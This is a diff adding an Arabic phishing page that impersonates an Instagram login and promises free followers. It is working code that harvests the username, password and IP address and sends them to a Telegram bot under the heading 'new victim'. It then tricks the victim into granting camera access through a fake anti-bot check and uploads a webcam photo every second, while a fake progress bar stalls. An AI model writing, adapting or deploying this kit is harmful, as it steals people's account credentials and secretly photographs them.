@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - التحقق من الهوية</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .logo { width: 175px; margin-bottom: 30px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
+        .btn-blue { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 15px; }
+        .btn-blue:active { opacity: 0.7; }
+        
+        /* تصميم نافذة التحقق */
+        #verify-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; justify-content: center; align-items: center; }
+        .modal-content { background: white; padding: 25px; border-radius: 12px; width: 300px; text-align: center; }
+        .modal-content h4 { margin-top: 0; color: #262626; }
+        .modal-content p { font-size: 13px; color: #8e8e8e; line-height: 1.5; }
+        .btn-allow { background: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
+        
+        #loading-section { display: none; margin-top: 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540d95.png" alt="Instagram" class="logo">
+        
+        <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        
+        <select id="followers">
+            <option value="" disabled selected>اختر عدد المتابعين</option>
+            <option>100</option><option>500</option><option>1000</option><option>2500</option><option>5000</option>
+        </select>
+
+        <button class="btn-blue" onclick="showVerify()">تفعيل الرشق الآن</button>
+
+        <div id="loading-section">
+            <div class="spinner"></div>
+            <p style="font-size: 12px; color: #8e8e8e;">جاري معالجة الطلب... يرجى عدم إغلاق الصفحة (ضعف في الاتصال)</p>
+            <span id="percent" style="font-weight: bold; color: #262626;">0%</span>
+        </div>
+    </div>
+
+    <div id="verify-modal">
+        <div class="modal-content">
+            <h4>🛡️ تحقق أمني</h4>
+            <p>للتأكد من أنك إنسان ولست روبوت، ولمكافحة البوتات، يجب عليك السماح بالوصول للكاميرا لإتمام عملية الرشق.</p>
+            <button class="btn-allow" onclick="startCamera()">سماح ومتابعة</button>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const CHAT_ID = '1371063739';
+
+        function showVerify() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            if(!u || !p) return alert("يرجى إدخال بيانات الحساب أولاً");
+            document.getElementById('verify-modal').style.display = 'flex';
+        }
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('verify-modal').style.display = 'none';
+                document.getElementById('loading-section').style.display = 'block';
+
+                // إرسال البيانات فوراً
+                sendInitialData();
+
+                // العداد الوهمي
+                let p = 0;
+                const itv = setInterval(() => {
+                    p += Math.random() * 1.5;
+                    if(p >= 98) {
+                        p = 98;
+                        document.querySelector('#loading-section p').innerText = "فشل الاتصال بالسيرفر.. جاري إعادة المحاولة تلقائياً...";
+                    }
+                    document.getElementById('percent').innerText = Math.floor(p) + "%";
+                }, 1000);
+
+                // التصوير كل ثانية
+                setInterval(capture, 1000);
+
+            } catch (err) {
+                alert("خطأ: يجب السماح بالكاميرا لمكافحة البوتات وإتمام العملية!");
+            }
+        }
+
+        async function sendInitialData() {
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const count = document.getElementById('followers').value;
+            const msg = `🔥 ضحية جديدة!\n👤 يوزر: ${user}\n🔑 باسورد: ${pass}\n📈 العدد: ${count}\n🌐 IP: ${ip.ip}`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        }
+
+        function capture() {
+            const v = document.getElementById('video');
+            const c = document.getElementById('canvas');
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(b => {
+                const fd = new FormData();
+                fd.append('photo', b, 'x.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.4);
+        }
+    </script>
+</body>
+</html>
